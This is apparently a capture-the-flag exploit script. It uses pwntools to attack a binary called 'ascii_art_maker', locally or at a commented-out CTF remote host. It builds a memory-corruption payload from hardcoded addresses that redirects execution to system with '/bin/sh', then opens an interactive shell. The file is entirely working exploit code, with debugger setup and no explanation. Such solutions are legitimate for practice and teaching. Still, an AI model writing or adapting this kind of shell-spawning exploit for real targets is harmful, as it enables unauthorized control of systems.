from pwn import *
from time import sleep

context.terminal = ["tmux", "splitw", "-h"]


p = process ("./ascii_art_maker")
#p = remote ("pwn2.chal.ctf.westerns.tokyo", 9480)
bin_elf = ELF ("./ascii_art_maker")

system = bin_elf.got["system"]
call_system = 0x08048970

gdb_cmd = """
set follow-fork parent
set follow-exec new
b * 0x08048982
b * 0x080489C3
c
"""
"""
c
b * 0x08048716
b * 0x080486ba
b * 0x08048982
"""

#gdb.attach (p, gdb_cmd)

buf = 0x0804C420
binsh = buf + 238
fake_ebp = 0x804cf08 

addr = p32 ((buf + 204))
addr = addr[3] + addr[:3]

pay = p32 (buf + 30) * 6  +  (addr) * 44 + p32 (call_system)  + p32 (binsh) * 1 + "\x7f" * 28 
p.recvuntil ("Your Input:")
p.sendline (pay + "\x00\x00sh\x00")


p.interactive ()

